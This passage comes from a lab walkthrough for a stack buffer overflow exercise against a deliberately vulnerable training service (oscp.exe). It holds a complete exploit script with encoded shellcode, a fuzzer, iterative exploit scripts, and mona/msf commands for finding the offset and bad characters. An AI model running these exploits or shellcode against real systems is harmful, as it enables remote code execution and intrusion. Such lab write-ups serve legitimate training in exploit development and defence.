shellcode += b"\xda\x5c\x2b\x98\x17\x0c\xe4\xd6\x8a\xa0\x81"
shellcode += b"\xa3\x16\x4b\xd9\x22\x1f\xa8\xaa\x45\x0e\x7f"
shellcode += b"\xa0\x1f\x90\x7e\x65\x14\x99\x98\x6a\x11\x53"
shellcode += b"\x13\x58\xed\x62\xf5\x90\x0e\xc8\x38\x1d\xfd"
shellcode += b"\x10\x7d\x9a\x1e\x67\x77\xd8\xa3\x70\x4c\xa2"
shellcode += b"\x7f\xf4\x56\x04\x0b\xae\xb2\xb4\xd8\x29\x31"
shellcode += b"\xba\x95\x3e\x1d\xdf\x28\x92\x16\xdb\xa1\x15"
shellcode += b"\xf8\x6d\xf1\x31\xdc\x36\xa1\x58\x45\x93\x04"
shellcode += b"\x64\x95\x7c\xf8\xc0\xde\x91\xed\x78\xbd\xfd"
shellcode += b"\xc2\xb0\x3d\xfe\x4c\xc2\x4e\xcc\xd3\x78\xd8"
shellcode += b"\x7c\x9b\xa6\x1f\x82\xb6\x1f\x8f\x7d\x39\x60"
shellcode += b"\x86\xb9\x6d\x30\xb0\x68\x0e\xdb\x40\x94\xdb"
shellcode += b"\x4c\x10\x3a\xb4\x2c\xc0\xfa\x64\xc5\x0a\xf5"
shellcode += b"\x5b\xf5\x35\xdf\xf3\x9c\xcc\x88\xf1\x6b\x8f"
shellcode += b"\xb7\x6e\x6e\x0f\x6b\x5e\xe7\xe9\x01\xb0\xa1"
shellcode += b"\xa2\xbd\x29\xe8\x38\x5f\xb5\x26\x45\x5f\x3d"
shellcode += b"\xc5\xba\x2e\xb6\xa0\xa8\xc7\x36\xff\x92\x4e"
shellcode += b"\x48\xd5\xba\x0d\xdb\xb2\x3a\x5b\xc0\x6c\x6d"
shellcode += b"\x0c\x36\x65\xfb\xa0\x61\xdf\x19\x39\xf7\x18"
shellcode += b"\x99\xe6\xc4\xa7\x20\x6a\x70\x8c\x32\xb2\x79"
shellcode += b"\x88\x66\x6a\x2c\x46\xd0\xcc\x86\x28\x8a\x86"
shellcode += b"\x75\xe3\x5a\x5e\xb6\x34\x1c\x5f\x93\xc2\xc0"
shellcode += b"\xee\x4a\x93\xff\xdf\x1a\x13\x78\x02\xbb\xdc"
shellcode += b"\x53\x86\xdb\x3e\x71\xf3\x73\xe7\x10\xbe\x19"
shellcode += b"\x18\xcf\xfd\x27\x9b\xe5\x7d\xdc\x83\x8c\x78"
shellcode += b"\x98\x03\x7d\xf1\xb1\xe1\x81\xa6\xb2\x23"


```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\xba\xdf\xf8\xfc\x5d\xdb\xc6\xd9\x74\x24\xf4"
shellcode += "\x5b\x33\xc9\xb1\x52\x31\x53\x12\x03\x53\x12"
shellcode += "\x83\x34\x04\x1e\xa8\x36\x1d\x5d\x53\xc6\xde"
shellcode += "\x02\xdd\x23\xef\x02\xb9\x20\x40\xb3\xc9\x64"
shellcode += "\x6d\x38\x9f\x9c\xe6\x4c\x08\x93\x4f\xfa\x6e"
shellcode += "\x9a\x50\x57\x52\xbd\xd2\xaa\x87\x1d\xea\x64"
shellcode += "\xda\x5c\x2b\x98\x17\x0c\xe4\xd6\x8a\xa0\x81"
shellcode += "\xa3\x16\x4b\xd9\x22\x1f\xa8\xaa\x45\x0e\x7f"
shellcode += "\xa0\x1f\x90\x7e\x65\x14\x99\x98\x6a\x11\x53"
shellcode += "\x13\x58\xed\x62\xf5\x90\x0e\xc8\x38\x1d\xfd"
shellcode += "\x10\x7d\x9a\x1e\x67\x77\xd8\xa3\x70\x4c\xa2"
shellcode += "\x7f\xf4\x56\x04\x0b\xae\xb2\xb4\xd8\x29\x31"
shellcode += "\xba\x95\x3e\x1d\xdf\x28\x92\x16\xdb\xa1\x15"
shellcode += "\xf8\x6d\xf1\x31\xdc\x36\xa1\x58\x45\x93\x04"
shellcode += "\x64\x95\x7c\xf8\xc0\xde\x91\xed\x78\xbd\xfd"
shellcode += "\xc2\xb0\x3d\xfe\x4c\xc2\x4e\xcc\xd3\x78\xd8"
shellcode += "\x7c\x9b\xa6\x1f\x82\xb6\x1f\x8f\x7d\x39\x60"
shellcode += "\x86\xb9\x6d\x30\xb0\x68\x0e\xdb\x40\x94\xdb"
shellcode += "\x4c\x10\x3a\xb4\x2c\xc0\xfa\x64\xc5\x0a\xf5"
shellcode += "\x5b\xf5\x35\xdf\xf3\x9c\xcc\x88\xf1\x6b\x8f"
shellcode += "\xb7\x6e\x6e\x0f\x6b\x5e\xe7\xe9\x01\xb0\xa1"
shellcode += "\xa2\xbd\x29\xe8\x38\x5f\xb5\x26\x45\x5f\x3d"
shellcode += "\xc5\xba\x2e\xb6\xa0\xa8\xc7\x36\xff\x92\x4e"
shellcode += "\x48\xd5\xba\x0d\xdb\xb2\x3a\x5b\xc0\x6c\x6d"
shellcode += "\x0c\x36\x65\xfb\xa0\x61\xdf\x19\x39\xf7\x18"
shellcode += "\x99\xe6\xc4\xa7\x20\x6a\x70\x8c\x32\xb2\x79"
shellcode += "\x88\x66\x6a\x2c\x46\xd0\xcc\x86\x28\x8a\x86"
shellcode += "\x75\xe3\x5a\x5e\xb6\x34\x1c\x5f\x93\xc2\xc0"
shellcode += "\xee\x4a\x93\xff\xdf\x1a\x13\x78\x02\xbb\xdc"
shellcode += "\x53\x86\xdb\x3e\x71\xf3\x73\xe7\x10\xbe\x19"
shellcode += "\x18\xcf\xfd\x27\x9b\xe5\x7d\xdc\x83\x8c\x78"
shellcode += "\x98\x03\x7d\xf1\xb1\xe1\x81\xa6\xb2\x23"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW4 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 2026 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```




# Task 6 oscp.exe - OVERFLOW5

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240902173034.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW2 test" to verify.

![800](img/Pasted%20image%2020240902173117.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240902173149.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW5 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW5 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240902173308.png)


10. Fuzzing crashed at 400 bytes. Create a pattern by adding 400 bytes, total of 800 bytes. 

![800](img/Pasted%20image%2020240902173321.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240902173348.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 800

```shell
──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW5 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 356B4134.

![800](img/Pasted%20image%2020240902174822.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 800 -q 356B4134
[*] Exact match at offset 314
```

EIP Offset is 314.

	Task 6
		a. What is the EIP offset for OVERFLOW4?
			314


18. In Kali. Edit the exploit.py. Add the offset 314 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW5 "  # The command or identifier expected by the target service
offset = 314            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger, showing EIP 42424242. Note the value ESP 017DFA30.

![800](img/Pasted%20image%2020240902175222.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240902175318.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00
```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW5 "  # The command or identifier expected by the target service
offset = 314             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 019EFA30.

![800](img/Pasted%20image%2020240902180019.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30

![](img/Pasted%20image%2020240902180132.png)

mona Memory comparison results, item 0
 Address=0x019efa30
 Status=Corruption after 21 bytes
 BadChars=00 16 17 2f 30 f4 f5 fd
 Type=normal
 Location=Stack



29. Based on the output 00 16 17 2f 30 f4 f5 fd. Only use 00 16 2f f4 fd to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 16 2f f4 fd".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff

for mona
\x00\x16\x2f\xf4\xfd
```

	Task 6
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW5?
			\x00\x16\x2f\xf4\xfd


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x16\x2f\xf4\xfd"

![800](img/Pasted%20image%2020240902180501.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW5 "  # The command or identifier expected by the target service
offset = 314             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
